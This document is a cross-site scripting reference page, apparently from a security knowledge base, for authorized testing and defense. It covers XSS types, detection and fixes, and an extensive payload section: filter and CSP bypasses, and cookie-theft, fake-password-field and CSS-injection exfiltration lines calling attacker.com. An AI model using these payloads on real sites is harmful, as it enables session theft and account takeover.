# Cross-Site Scripting

> Attacker script executes in another user's browser in the app's origin. **Deep dive:**
> [`Troubleshooting_Guide/xss.md`](../../../../Troubleshooting_Guide/xss.md) ·
> **Skill:** [`ai_framework/skills/`](../../../ai_framework/skills/README.md)

**Aliases / OWASP:** XSS · A03:2021 Injection
**Languages:** English · [Tiếng Việt](README.vi.md)
**Status:** complete

## What it is
XSS occurs when an application includes attacker-controlled data in a page without correct
context-aware escaping, so the browser executes it as script. The attacker's code then runs with
the victim's session, in the application's origin.

## How it works
Three classic forms:
- **Reflected** — payload in the request is echoed straight into the response (e.g. a search
  term), executing for whoever follows the crafted link.
- **Stored / persistent** — payload is saved (comment, profile) and runs for every viewer.
- **DOM-based** — client-side JS reads a source (`location.hash`, `document.URL`) and writes it
  to a dangerous sink (`innerHTML`, `eval`) without sanitization. See also `dom_based`.

## Impact
Session/cookie theft, account takeover, credential capture via fake forms, CSRF-token theft,
keylogging, drive-by actions performed as the victim, and worm-like propagation for stored XSS.

## How to detect
- A reflected marker (`'"><svg onload=…>`) appears unescaped in HTML, an attribute, or a script
  context.
- Inputs rendered into `innerHTML`/template literals client-side.
- Differences across contexts (HTML body vs attribute vs JS string vs URL) — each needs its own
  payload and escaping.

## Exploitation (summary)
Identify the reflection context, break out of it, and execute (`<script>`, event handlers,
`javascript:` URIs, or JS-string breakouts). Bypass filters with case/encoding tricks and
alternate tags/events. Use a benign `alert(document.domain)` PoC; escalate to session exfil only
within scope. Full payloads in the deep-dive note.

## Payloads & techniques
> Distilled from field payload references — for authorized testing only.

### Context detection
Inject `"><'`+"`"+`${` and observe which characters come back encoded — this tells you the
context and which breakout you need.

| Context | Behavior | Breakout |
|---------|----------|----------|
| HTML body | `<` `>` encoded | tag injection |
| HTML attribute (quoted) | `"`/`'` encoded | close quote then `on…=` |
| JS string | `\` `'` `"` escaped | `'-alert(1)-'` / `';alert(1)//` |
| JS template literal | `${` not escaped | `${alert(1)}` |
| URL parameter | browser-encoded | `javascript:` URI |

### HTML body / reflected / stored
```html
<svg onload=alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror="alert(1)">
<audio src=x onerror=alert(1)>
<embed src=x onerror=alert(1)>
<object data=x onerror=alert(1)>
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<keygen onfocus=alert(1) autofocus>
```

### Attribute context
```html
" onmouseover="alert(1)
" onfocus="alert(1)" autofocus="
" onclick="alert(1)">
```
Unquoted attribute lets you add a handler with whitespace only: `onmouseover=alert(1)`.

### JavaScript-string context
```javascript
'-alert(1)-'          // single-quoted string
';alert(1)//          // statement terminate
\';alert(1)//         // backslash escapes the app's escaping
</script><script>alert(1)</script>   // terminate the script element entirely
\"-alert(1)}//        // JSON/eval breakout
```

### AngularJS / template injection
```html
{{constructor.constructor('alert(1)')()}}
{{a=alert(1)}}
<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x
<body onresize="alert(document.cookie)">
```
Deliver `onresize` via an auto-resizing iframe:
```html
<iframe src="https://victim.com/?search=<body onresize=print()>" onload="this.style.width='10px'"></iframe>
```

### SVG vectors
```html
<svg><animate onbegin=alert(1) attributeName=x></animate></svg>
<svg><animatetransform onbegin=alert(1) attributeName=transform></animatetransform></svg>
<svg><a><animate attributeName=href values="javascript:alert(1)"/><text y=20>click</text></a></svg>
<svg><set attributeName=href to="javascript:alert(1)">
```

### WAF / filter bypass
- **Custom element** when standard tags are blocked: `<xss id=x onfocus=alert(1) tabindex=1>#x</xss>`
- **SMIL/animation events**: `onbegin onend onrepeat onfocusin onfocusout`
- **Accesskey** (fires on Alt+Shift+X): `%27accesskey=%27x%27onclick=%27alert(1)`
- **Encoding/whitespace tricks** between attribute name and `=`:
```html
<img src=x onerror%00=alert(1)>
<img src=x onerror&#10;=alert(1)>
<ScRiPt>alert(1)</ScRiPt>
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
```
- **noscript breakout** in attribute context:
```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

### CSP bypass
```html
<img src='https://attacker.com/log?data=        <!-- dangling markup, captures markup to next quote -->
<script nonce=ABC123>alert(1)</script>           <!-- reuse a leaked/predictable nonce -->
```
`unsafe-eval` or a same-origin `script-src` lets plain `<script>alert(1)</script>` through.

### Mutation XSS (mXSS)
```html
<svg><p><style><!--</style></p><img src=x onerror=alert(1)></p>
```

### postMessage XSS
```javascript
parent.postMessage('<img src=x onerror=alert(1)>', '*');   // when receiver writes data to a sink
```

### File upload (SVG / HTML)
```html
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">
  <script>alert(document.cookie)</script>
</svg>
```

### Exfiltration & escalation
```javascript
fetch("https://attacker.com/steal?c=" + document.cookie);   // cookie theft
```
```html
<!-- credential capture: fake password field -->
<input name="username" id="username">
<input type="password" onchange="fetch('https://attacker.com/steal',{method:'POST',body:username.value+':'+this.value})">
```
```javascript
// CSRF via XSS: read the token from one page, replay the protected action
fetch("/email/change-email").then(r=>r.text()).then(html=>{
  var t=html.match(/csrf[^>]+value="([^"]+)"/)[1];
  fetch("/email/change-email",{method:"POST",body:"email=attacker@evil.com&csrf="+t});
});
```
```css
/* CSS-injection exfil: leak a value character-by-character */
input[value^="a"]{background:url("https://attacker.com/?c=a")}
input[value^="b"]{background:url("https://attacker.com/?c=b")}
```

### Selection guide
| Situation | Payload |
|-----------|---------|
| No filters | `<script>alert(1)</script>` |
| `<script>` blocked | `<img src=x onerror=alert(1)>` |
| `<img>` blocked | `<svg onload=alert(1)>` |
| Event handlers blocked | `<a href="javascript:alert(1)">click</a>` |
| `href` blocked | `<svg><animate onbegin=alert(1)>` |
| All standard tags blocked | `<xss onfocus=alert(1) tabindex=1>#x</xss>` |
| AngularJS page | `{{constructor.constructor('alert(1)')()}}` |
| JS string context | `'-alert(1)-'` |
| Template literal | `${alert(1)}` |
| CSP blocks scripts | dangling-markup `<img>` |

## Defenses
1. **Context-aware output encoding** (HTML, attribute, JS, URL) — the primary fix.
2. A strict **Content-Security-Policy** as defense-in-depth (`script-src` nonces/hashes).
3. Frameworks' auto-escaping; avoid `innerHTML`/`dangerouslySetInnerHTML`; sanitize with a
   vetted library (DOMPurify) when raw HTML is unavoidable.
4. `HttpOnly` cookies to blunt token theft.

## Finding CVEs from scratch
- **NVD** — https://nvd.nist.gov/vuln/search?query=Cross-Site+Scripting
- **CVE.org** — https://www.cve.org/CVERecord/SearchResults?query=Cross-Site+Scripting
- **Exploit-DB** — https://www.exploit-db.com/search?q=XSS
- **GitHub Advisories** — https://github.com/advisories?query=xss (huge for npm/WordPress plugins)
- **OSV** — https://osv.dev/list?q=xss
- **Community** — r/netsec, HackerOne (`weakness:"Cross-site Scripting (XSS)"` — the most-reported class), WPScan for WordPress plugins.
- _Query tip: WordPress/Drupal plugins and admin panels are the richest hunting grounds:_
  `"<plugin> <version>" stored XSS`.

## Notable CVEs
_Illustrative — verify against NVD before relying on details._
- `CVE-2023-37580` — Zimbra Collaboration reflected XSS, exploited in the wild.
- `CVE-2019-11358` — jQuery prototype pollution often chained to XSS (see `prototype_pollution`).
- _Canonical pre-CVE example: the 2005 "Samy" worm on MySpace (stored XSS, self-propagating)._

## References
- PortSwigger Web Security Academy — Cross-site scripting.
- OWASP — XSS Prevention & DOM-based XSS Prevention Cheat Sheets.
